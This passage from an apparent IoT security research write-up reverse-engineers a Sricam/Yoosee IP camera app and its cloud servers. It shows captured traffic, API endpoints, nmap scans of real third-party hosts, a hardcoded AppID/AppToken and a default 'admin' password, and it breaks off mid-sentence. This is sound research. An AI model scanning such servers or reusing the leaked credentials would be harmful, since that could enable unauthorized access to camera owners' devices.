Users/AddFriend.ashx    &amp;amp;MonitorPwd=    &amp;amp;RemarkName=    &amp;amp;Groupname= &amp;amp;FriendID=  
Users/DeleteFriend.ashx &amp;amp;DelFromHisList=0   Users/GetFriendList.ashx    &amp;amp;Type=  
Users/PhoneCheckCode.ashx   &amp;amp;PhoneNO=   CountryCode=    
Users/RegisterCheck.ashx    &amp;amp;IgnoreSafeWarning= &amp;amp;VerifyCode=    &amp;amp;CountryCode=   &amp;amp;Email= &amp;amp;RePwd= VersionFlag=1&amp;amp;Pwd=  
Users/modifyFriendRemarkName.ashx   &amp;amp;OldRemarkName= &amp;amp;NewRemarkName= 
Users/ModifyMonitorPwd.ashx {&quot;error_code&quot;:&quot;100100&quot;,&quot;error&quot;:&quot;ÕÒ²»µ½¿ÉÓÃ·þÎñÆ÷&quot;}  {&quot;error_code&quot;:&quot;100101&quot;,&quot;error&quot;:&quot;·¢ËÍÇëÇóÊ§°Ü&quot;}  ðíHTTP    
  Host:   Content-Length: %ld
   User-Agent: Neeao/4.0
 Accept-Encoding: gzip, default
    Accept-Language: en-us
    Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*
  HTTP/1.0
 POST    GET     Content-Type: application/x-www-form-urlencoded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This will reveal some common HTTP requests and the related attributes that has to be sent with the request. I tried several ones with random filling of the known attributes which only resulted in errors.&lt;/p&gt;

&lt;h4 id=&quot;334-direct-communication-between-ipcam-and-servers&quot;&gt;3.3.4 Direct Communication between IPCam and servers&lt;/h4&gt;

&lt;p&gt;Using this rule we can filter only the direct communication of the IPCam:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/ipcam_10.0.1.25.cap&quot;&gt;IPCam Communication to Server&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip.addr == 10.0.1.25
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s obvious, that the exchanged payloads are encrypted somehow as I’m not able to read it’s content directly or base64 etc. I guess the encrypting for these UDP messages will happen for the IPCam in the npc binary too. It has to be some static encryption as many bit chunks will repeat often.&lt;/p&gt;

&lt;h3 id=&quot;335-collecting-information&quot;&gt;3.3.5 Collecting Information&lt;/h3&gt;

&lt;p&gt;I collected a list of participating servers with IP and often used requests:&lt;/p&gt;

&lt;div align=&quot;right&quot;&gt;
&lt;table border=&quot;0&quot;&gt;
&lt;tr&gt;
&lt;td&gt;videoipcamera.com&lt;/td&gt;
&lt;td&gt;218.30.35.92&lt;/td&gt;
&lt;td&gt;POST /Users/GetFriendList.ashx&lt;/td&gt;
&lt;td&gt;POST /Users/AddFriend.ashx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;videoipcamera.cn&lt;/td&gt;
&lt;td&gt;101.1.17.22&lt;/td&gt;
&lt;td&gt;POST /Users/GetFriendList.ashx&lt;/td&gt;
&lt;td&gt;POST /Users/AddFriend.ashx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;upg1.videoipcamera.cn&lt;/td&gt;
&lt;td&gt;218.30.35.92&lt;/td&gt;
&lt;td&gt;GET /00/06/latestversion.asp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p2p1.videoipcamera.cn&lt;/td&gt;
&lt;td&gt;146.0.238.42&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;api1.videoipcamera.cn&lt;/td&gt;
&lt;td&gt;101.1.17.22&lt;/td&gt;
&lt;td&gt;POST /Users/LoginCheck.ashx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;api2.videoipcamera.cn&lt;/td&gt;
&lt;td&gt;218.30.35.92&lt;/td&gt;
&lt;td&gt;POST /Users/LoginCheck.ashx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p2p2.videoipcamera.com&lt;/td&gt;
&lt;td&gt;218.30.35.92&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;api3.videoipcamera.cn&lt;/td&gt;
&lt;td&gt;101.1.17.22&lt;/td&gt;
&lt;td&gt;POST /Users/LoginCheck.ashx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p2p6.videoipcamera.com&lt;/td&gt;
&lt;td&gt;101.1.17.22&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;api4.videoipcamera.com&lt;/td&gt;
&lt;td&gt;146.0.238.42&lt;/td&gt;
&lt;td&gt;POST /Users/LoginCheck.ashx&lt;/td&gt;
&lt;td&gt;UDP Port 8000&lt;/td&gt;
&lt;td&gt;UDP Port 51880&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p2p3.videoipcamera.com&lt;/td&gt;
&lt;td&gt;146.0.238.42&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p2p4.videoipcamera.com&lt;/td&gt;
&lt;td&gt;146.0.238.42&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt; 
&lt;td&gt;92.42.106.94&lt;/td&gt;
&lt;td&gt;UDP Port 4000&lt;/td&gt;
&lt;td&gt;UDP Port 4001&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p2p5.videoipcamera.com&lt;/td&gt;
&lt;td&gt;103.41.127.199&lt;/td&gt;
&lt;td&gt;UDP Port 51880&lt;/td&gt;
&lt;td&gt;UDP Port 51881&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;104-250-152-26.static.gorillaservers.com&lt;/td&gt;
&lt;td&gt;104.250.152.26&lt;/td&gt;
&lt;td&gt;UDP Port 8000&lt;/td&gt;
&lt;td&gt;UDP Port 8001&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;There are some other servers participated talking directly to the IPCam and the Phone over UDP.
We can identify some often used UDP Ports on our devices:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Phone =&amp;gt; IPCam UDP to 51880&lt;/li&gt;
  &lt;li&gt;IPCam =&amp;gt; Phone UDP to 5188{0,1,2}
Please be cautious, when intended to scan unkown web servers. Your actions could be understand as an attack.
```bash
$ nmap -sU -p8000 api4.videoipcamera.com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;PORT     STATE         SERVICE
8000/udp open|filtered irdmi  # Intel Remote Desktop Management Interface&lt;/p&gt;

&lt;p&gt;$ nmap -sU -p4000 92.42.106.94&lt;/p&gt;

&lt;p&gt;PORT     STATE         SERVICE
4000/udp open|filtered icq  # conferencing protocol&lt;/p&gt;

&lt;p&gt;$ nmap -sU -p4001 92.42.106.94&lt;/p&gt;

&lt;p&gt;PORT     STATE         SERVICE
4001/udp open|filtered newoak&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I guess this UDP ports are used to control the IPCam and the app remotely.

```bash
$ nmap 92.42.106.94                                                   

PORT     STATE  SERVICE
3389/tcp open   ms-wbt-server
5060/tcp closed sip
5061/tcp closed sip-tls


$ nmap 103.41.127.199

PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
593/tcp   filtered http-rpc-epmap
1025/tcp  filtered NFS-or-IIS
3389/tcp  open     ms-wbt-server
6129/tcp  filtered unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
49165/tcp open     unknown


$ host 104.250.152.26
26.152.250.104.in-addr.arpa domain name pointer 104-250-152-26.static.gorillaservers.com.

$ nmap 104.250.152.26

PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
593/tcp   filtered http-rpc-epmap
1025/tcp  filtered NFS-or-IIS
6129/tcp  filtered unknown
8080/tcp  open     http-proxy
9090/tcp  open     zeus-admin
33899/tcp open     unknown
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49158/tcp open     unknown
49159/tcp open     unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Using GeoLocation services the server 104.250.152.26 is the only one that isn’t hosted in China. Regarding the similiar port fingerprint and exchanging similiar UDP messages with mobile phone and IPCam I can determine that this server is involved in the infrastructure.
We can see multiple server with interesting port fingerprint and interesting UDP ports, too. Without strong assumption of vulnerabilities, I won’t start to attack any server.
Collecting some encrypted Info bits, that may will help me on reversing App and firmware:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Passwort: &amp;lt;secret&amp;gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 891A54C4E2EAB52D01C6FBF85A4C143E  &lt;span class=&quot;c&quot;&gt;# hashing for passwort&lt;/span&gt;
UserID: 0732910 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-2146750738&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# conversion for UserID&lt;/span&gt;

Encrypted UDP: 10.0.0.21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IPCam&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; -&amp;gt; 10.0.0.27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Smartphone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
00:00:00:02:00:00:00:01:00:00:00:50:00:00:00:01:00:09:41:38:00:00:00:07:00:00:00:01:0e:00:00:0f:00:30:61:72:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:2f:00:00:00:00:00:00:00:00

Encrypted UDP: 10.0.0.27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Smartphone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; -&amp;gt; 146.0.238.42
0c:05:03:00:ee:b6:b9:67:ee:2e:0b:80:3c:88:2a:1d:4e:25:36:4f:9a:44:28:8e:00:00:00:00:e4:74:85:3b

Encrypted UDP: 146.0.238.42 -&amp;gt; 10.0.0.27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Smartphone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0d:01:00:00:9a:44:28:8e:b1:e8:c6:af:09:00:00:00:5c:2a:6a:5e:0f:a0:01:01:92:00:ee:2a:ca:a8:01:01:68:fa:98:1a:1f:40:01:01:67:29:7f:c7:ca:a8:01:01:dc:e7:8e:89:22:53:03:01:da:1e:23:5c:22:53:03:01:92:00:ee:2a:22:53:03:01:da:1e:23:5c:2b:5c:04:01:92:00:ee:2a:2b:5c:04:01
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This UDP packet payloads are exchanged between smartphone and multiple servers (146.0.238.42,103.41.127.199,104.250.152.26):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0103caa80a00011eee2e0b80b486ca4d073e19397593056b8675f8030001000051000000
0103caa80a00011eee2e0b8024ac620c080cc0b07aa1dce26f79f8030001000051000000
0203caa800000000ee2e0b80b486ca4d073e19397593056b8675f80300010000010000000000000000000000
0203caa800000000ee2e0b8024ac620c080cc0b07aa1dce26f79f80300010000010000000000000000000000
0103caa80a00011eee2e0b806285763d44675edb36ca4289587df8030001000051000000
0103caa80a00011eee2e0b80422226691c0471f66ea96da44381f8030001000051000000
0203caa800000000ee2e0b806285763d44675edb36ca4289587df80300010000010000000000000000000000
0103caa80a00011eee2e0b802792d54f60749ffd12d983af2d85f8030001000051000000
0203caa800000000ee2e0b80422226691c0471f66ea96da44381f80300010000010000000000000000000000
0203caa800000000ee2e0b802792d54f60749ffd12d983af2d85f80300010000010000000000000000000000

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This partly cleartext packages was exchanged between IPCam and phone when trying to subscribe an email for an alarm notification:
&lt;a href=&quot;https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/email_subscribe.cap&quot;&gt;Email Subscribing for Alarm&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0.......p...........8...
....iZo8...Ej.q.iZo(H..........0........N............[o....IC.q..[oPPvop.Po[... ...........433.../..............GVo8.[o............
.....C...U.8.[o..C..........W.sa....6..........`...|E.k........hildagard@temp-mail.de..............................................smtp.gmail.com,173.194.193.108,173.194.67.108...................anabelle@shitmail.de............................................2v..i....i0e....`iZo....`...=8O.^....F..0.......p...........8...Attention: alarm...............................................qDear User,
 Please check the attached picture for more information.................................sa...|E.k........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It needs more research and examination to get the “bigger picture” of this server infrastructure. But most important for this part, getting information about encryption and key management.&lt;/p&gt;

&lt;h2 id=&quot;4-reversing&quot;&gt;4. Reversing&lt;/h2&gt;

&lt;p&gt;There are multiple binaries contributed to the whole application that are worth to be examined. We have to look at the android application and the extracted firmware. Moreover there are single binaries in the firmware beeing suspected to store interesting information that have to be examined. I will go through this process by using different tools to get deeper into the application logic.&lt;/p&gt;

&lt;h3 id=&quot;41-jadx&quot;&gt;4.1 JADX&lt;/h3&gt;

&lt;p&gt;JADX is a decompiler for java executables that will also process apk.
You can simply execute the binary of jadx by appending your desired apk.&lt;/p&gt;

&lt;p&gt;On executing JADX I recognized this:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Exception &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;thread java.lang.OutOfMemoryError: Java heap space
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As I work in a VM with low RAM JADX overflows my virtual machine heap. By changing the environment variable we can maximize the memory space and using only one thread it will work better.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ JAVA_OPTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-Xmx1300M&quot;&lt;/span&gt; ../tools/jadx/bin/jadx &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; 1 Sricam_17.7.17_apk-dl.com.apk 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;But there are a lot of errors on execution of JADX. Although I started in examining the decompiled files.
At first glance I will search for JNI (Java Native Interfaces) that could reveal linkings to the library files:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/doku/Sricam_17.7.17_apk-dl.com&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rli&lt;/span&gt; jni &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./com/mediatek/elian/ElianNative.java
./com/baidu/android/pushservice/g.java
./com/baidu/android/pushservice/message/g.java
./com/baidu/android/pushservice/c/e.java
./com/baidu/android/pushservice/c/j.java
./com/baidu/android/pushservice/c/b.java
./com/baidu/android/pushservice/util/c.java
./com/baidu/android/pushservice/util/s.java
./com/baidu/android/pushservice/j/d.java
./com/baidu/android/pushservice/jni/PushSocket.java
./com/baidu/android/pushservice/jni/BaiduAppSSOJni.java
./com/baidu/android/pushservice/g/d.java
./com/baidu/android/pushservice/f.java
./com/baidu/android/pushservice/config/b.java
./com/xapcamera/SetWifiActivity3.java
./com/tencent/connect/auth/AuthDialog.java
./com/tencent/stat/StatNativeCrashReport.java
./com/tencent/open/web/security/SecureJsInterface.java
./com/tencent/open/web/security/JniInterface.java
./ilnk/lib/IlnkApi.java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We can see on first position ElianNative.java the load of libraries for the wifi chip.&lt;/p&gt;
&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;LoadLib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadLibrary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elianjni&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will look into the paired library file in the unzipping part of the APK.
Searching for other interesting strings:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/doku/Sricam_17.7.17_apk-dl.com&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rli&lt;/span&gt; aes &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./cn/jiguang/api/BasePreferenceManager.java
./cn/jiguang/api/JCoreInterface.java
./com/sina/weibo/sdk/cmd/WbAppActivator.java
./com/sina/weibo/sdk/utils/AesEncrypt.java
./com/baidu/android/pushservice/message/g.java
./com/baidu/android/pushservice/config/b.java
...
./com/baidu/android/pushservice/c/b.java

&lt;span class=&quot;c&quot;&gt;# ~/doku/Sricam_17.7.17_apk-dl.com/cn/jiguang&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rli&lt;/span&gt; encrypt &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./res/layout/activity_modify_npc_bound_email.xml
./res/layout-v11/activity_modify_npc_bound_email.xml
./cn/jiguang/api/BasePreferenceManager.java
./cn/jiguang/c/a/a.java
./cn/jiguang/a/a/b/h.java
./com/google/zxing/client/result/WifiParsedResult.java
./com/xapcamera/entity/Email.java
./com/xapcamera/p2p/SettingListener.java
./com/xapcamera/device/settings/AlarmSetActivity.java
./com/xapcamera/device/settings/ModifyBoundEmailActivity.java
./com/xapcamera/R.java
./com/p2p/core/MediaPlayer.java
./com/p2p/core/P2PHandler.java
./com/p2p/core/utils/DES.java
...
./com/tencent/open/utils/SystemUtils.java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;BasePreferenceManager.java seems to be interesting. Looking into the sourcecode reveals nothing good:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public abstract class BasePreferenceManager {
    private static final String AES_ENCRYPTION_SEED;
    private static final String JPUSH_PREF;
    private static SharedPreferences mSharedPreferences;
    private static final String[] z;
    /* JADX: method processing error */
    /*
        Error: java.lang.StackOverflowError
	...

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Checking this with multiple other decompilers lead to the same result. (See in Bytecode Viewer)
This file as many others have shortly after beginning some decompiler errors. Some sort of decompiling protection, I guess.
I don’t know enough about Android Reversing, so I can’t interprete this the right way at the moment and research doesn’t bring fruity results about this.&lt;/p&gt;

&lt;p&gt;Another interesting file points to a default user on a p2p server:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ vim lnkConstant.java

    public static final String P2P_PARAM_DEFAULT_DEVICE_ID = &quot;XXX-000000-XXXXX&quot;;
    public static final String P2P_PARAM_DEFAULT_DEVICE_NAME = &quot;Node161205&quot;;
    public static final String P2P_PARAM_DEFAULT_PWD = &quot;admin&quot;;
    public static final String P2P_PARAM_DEFAULT_SERVER = &quot;EKPNHXIDAUAOEHLOTBSQEJSWPAARTAPKLXPGENLKLUPLHUATSVEESTPFHWIHPDIEHYAOLVEISQLNEGLPPALQHXERELIALKEHEOHZHUEKIFEEEPEJ-$$&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I suspected a encrypted domain name in the default_server but I wasn’t able to decrypt it.&lt;/p&gt;

&lt;p&gt;It’s possible to checkout the upgrade mechanism for the apk on the upg1 server. But redo all requests from a desktop browser by simply appending the clear strings like “/latestversion.asp” results in 404.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ vim ./com/p2p/core/update/UpdateManager.java
...
private static final String UPDATE_URL = &quot;http://upg1.videoipcamera.cn/&quot;;
...

public boolean checkUpdate() {
...
StringBuilder(UPDATE_URL).append(version_parse[0]).append(HttpUtils.PATHS_SEPARATOR).append(version_parse[1]).append(&quot;/latestversion.asp&quot;).toString();
...

public String getUpdateDescription() {
		...
            HttpURLConnection connection = (HttpURLConnection) new URL(new StringBuilder(UPDATE_URL).append(version_parse[0]).append(HttpUtils.PATHS_SEPARATOR).append(version_parse[1]).append(&quot;/des_html.asp&quot;).toString()).openConnection();
         
       		....

public void downloadApk(Handler handler, String filePath, String fileName) {
     		...
                HttpURLConnection connection = (HttpURLConnection) new URL(&quot;http://upg1.videoipcamera.cn//&quot; + version_parse[0] + HttpUtils.PATHS_SEPARATOR + version_parse[1] + HttpUtils.PATHS_SEPARATOR + this.version_server.trim() + &quot;.apk&quot;).openConnection();
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Another interesting file bit is in WXLoginRequest. It reveals another post request “Users/ThirdLogin.ashx” with ID and Token to http://api1.cloudlinks.cn/Users/ThirdLogin.ashx.
Overall it reveals the origin of the smartphone app:
https://www.yooseecamera.com/&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim ./com/xapcamera/network/WXLoginRequest.java

params.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new BasicNameValuePair&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AppID&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;d591b466644a0420e5f29aefb0cf0088&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        params.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new BasicNameValuePair&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AppToken&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;2db6962ff0901b8ce771f20f14a651a2786086e55615f951aa0c7c9b33fc5340&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        params.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new BasicNameValuePair&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Language&quot;&lt;/span&gt;, App.application.getResources&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.getConfiguration&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.locale.getLanguage&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        params.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new BasicNameValuePair&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AppOS&quot;&lt;/span&gt;, Constants.VIA_TO_TYPE_QQ_DISCUSS_GROUP&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        params.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new BasicNameValuePair&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AppName&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;com.yoosee&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        String[] parseVerson &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new String[]&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;00&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;46&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;00&quot;&lt;/span&gt;, Constants.VIA_REPORT_TYPE_WPA_STATE&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        int c &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Integer.parseInt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;parseVerson[2]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;;
        params.add(new BasicNameValuePair(&quot;AppVersion&quot;, String.valueOf((((Integer.parseInt(parseVerson[0]) &amp;lt;&amp;lt; 24) | (Integer.parseInt(parseVerson[1]) &amp;lt;&amp;lt; 16)) | c) | Integer.parseInt(parseVerson[3]))));
        params.add(new BasicNameValuePair(&quot;PackageName&quot;, &quot;com.yoosee&quot;));
        params.add(new BasicNameValuePair(&quot;ApiVersion&quot;, Constants.VIA_TO_TYPE_QQ_GROUP));
        return doPost(params, &quot;Users/ThirdLogin.ashx&quot;);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;cloudlinks.cn redirects to gwelltimes.cc which seems to provide a SDK for creating P2P enabled devices like our IPCam.
This Post Request looks like the login for the cloud API to initialize a P2P session.
I tried to do the same with curl with the help of https://github.com/dxsdyhm/GwellDemo and http://doc.cloud-links.net/SDK/iOS/GWP2P/GWP2PDeveloperGuide.html#10101 but I got everytime the same result:&lt;/p&gt;
